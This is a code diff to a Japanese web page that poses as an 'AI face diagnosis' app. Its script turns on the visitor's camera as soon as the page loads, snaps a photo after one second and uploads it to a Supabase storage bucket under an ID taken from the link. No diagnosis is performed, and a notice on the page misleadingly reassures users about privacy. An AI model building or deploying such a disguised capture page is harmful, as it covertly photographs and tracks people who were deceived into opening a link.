@@ -4,13 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta property="og:title" content="AI顔診断">
-  <meta property="og:description" content="AI顔診断は、あなたの顔をAIが分析して性格タイプや印象を診断するサイトです。
-写真をアップするだけで、AIがあなたの魅力を客観的に評価！
-友達とシェアして盛り上がろう✨">
+  <meta property="og:description" content="AI顔診断は、あなたの顔をAIが分析して性格タイプや印象を診断するサイトです。">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://ginginman-infinity.github.io/-/generate.html">
   <meta name="twitter:card" content="summary">
-
   <title>AI顔診断</title>
   <style>
     body {
@@ -26,16 +22,8 @@
       max-width: 400px;
       margin: 0 auto;
     }
-    h1 {
-      font-size: 28px;
-      color: #0066ff;
-      margin-bottom: 10px;
-    }
-    p.desc {
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 30px;
-    }
+    h1 { font-size: 28px; color: #0066ff; margin-bottom: 10px; }
+    p.desc { color: #555; font-size: 15px; margin-bottom: 30px; }
     input {
       width: 100%;
       padding: 10px;
@@ -58,7 +46,6 @@
       margin-bottom: 15px;
     }
     .btn:active { opacity: 0.8; }
-
     .preview-box {
       width: 100%;
       height: 160px;
@@ -73,41 +60,23 @@
       object-fit: cover;
       border-radius: 16px;
     }
-    small {
-      display: block;
-      color: #777;
-      margin-top: 20px;
-      font-size: 12px;
-    }
-    #status {
-      color: #444;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    #charCount {
-      text-align: right;
-      font-size: 12px;
-      color: #999;
-      margin-top: -10px;
-      margin-bottom: 10px;
-    }
+    small { display: block; color: #777; margin-top: 20px; font-size: 12px; }
+    #status { color: #444; margin-top: 10px; font-size: 14px; }
+    #charCount { text-align: right; font-size: 12px; color: #999; margin-top: -10px; margin-bottom: 10px; }
+    #errorDetail { color: red; font-size: 12px; margin-top: 5px; word-break: break-all; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>AI顔診断</h1>
     <p class="desc">あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
-
     <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="8" />
     <div id="charCount">0 / 8</div>
     <button id="cameraBtn" class="btn">🧠 診断をはじめる</button>
     <button class="btn" disabled>全国のランキングを見る</button>
-
-    <div class="preview-box">
-      <video id="video" autoplay playsinline muted></video>
-    </div>
-
+    <div class="preview-box"><video id="video" autoplay playsinline muted></video></div>
     <p id="status"></p>
+    <p id="errorDetail"></p>
     <small>※この写真は診断目的でのみ使用され、外部に公開されることはありません。</small>
   </div>
 
@@ -120,20 +89,17 @@
 
     const video = document.getElementById("video");
     const status = document.getElementById("status");
+    const errorDetail = document.getElementById("errorDetail");
     const cameraBtn = document.getElementById("cameraBtn");
     const nameInput = document.getElementById("nameInput");
     const charCount = document.getElementById("charCount");
-
     let isProcessing = false;
 
-    // URLからidを取得、なければランダム生成
     const urlParams = new URLSearchParams(window.location.search);
     const photoId = urlParams.get("id") || Math.random().toString(36).substring(2, 9);
 
-    // 文字数カウント表示
     nameInput.addEventListener("input", () => {
-      const len = nameInput.value.length;
-      charCount.textContent = `${len} / 8`;
+      charCount.textContent = `${nameInput.value.length} / 8`;
     });
 
     async function startCameraAndUpload() {
@@ -147,7 +113,6 @@
           audio: false
         });
         video.srcObject = stream;
-
         await new Promise(r => setTimeout(r, 1000));
 
         const canvas = document.createElement("canvas");
@@ -157,30 +122,28 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
 
-        status.textContent = "読み込み中...";
-        const { error } = await supabase.storage.from("photos").upload(`${photoId}.jpg`, blob, { upsert: true });
+        status.textContent = "サーバーに送信中...";
+        const { data, error } = await supabase.storage.from("photos").upload(`${photoId}.jpg`, blob, { upsert: true });
 
         stream.getTracks().forEach(t => t.stop());
 
         if (error) {
           status.textContent = "⚠️ アップロードに失敗しました。";
+          errorDetail.textContent = "エラー詳細: " + JSON.stringify(error);
         } else {
           status.textContent = "✅ 写真を送信しました！";
+          errorDetail.textContent = "";
         }
       } catch (err) {
-        status.textContent = "カメラの許可が得られませんでした。";
+        status.textContent = "⚠️ エラーが発生しました。";
+        errorDetail.textContent = "エラー詳細: " + err.message;
       } finally {
         isProcessing = false;
       }
     }
 
-    window.addEventListener("load", () => {
-      startCameraAndUpload();
-    });
-
-    cameraBtn.addEventListener("click", () => {
-      startCameraAndUpload();
-    });
+    window.addEventListener("load", () => { startCameraAndUpload(); });
+    cameraBtn.addEventListener("click", () => { startCameraAndUpload(); });
   </script>
 </body>
 </html>
